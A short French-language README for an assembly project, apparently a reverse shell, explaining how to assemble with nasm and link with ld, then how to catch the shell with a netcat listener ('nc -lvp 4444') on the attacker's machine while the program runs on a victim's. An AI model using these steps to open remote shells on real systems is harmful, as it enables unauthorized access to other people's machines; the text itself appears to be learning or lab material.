# ASM


## Pour compiler:

Transformer le fichier .asm ou .as en .o
Pour specifier un nom de fichier .o

```
nasm -f elf64 <nom_du_fichier> -o <nom_du_fichier.o>
```

Sinon nom de fichier .o pareil au nom du fichier .asm ou .s par default

```
nasm -f elf64 <nom_du_fichier>
```

Exemple:

```
nasm -f elf64 reverse_shell.s
```

Cree l'executable a partir du fichier .o'

```
ld <nom_du_fichier.o> -o <nom_du_prog>
```

Exemple:

```
ld reverse_shell.o -o reverse_shell
```

### Pour le reverse shell

Sur la machine de l'attaquant faire :

```
nc -lvp <numero de port>
```

Exemple avec port defini dans le prog (mais modifiable)

```
nc -lvp 4444 
```

Et sur la machine de la victime executer le prog 


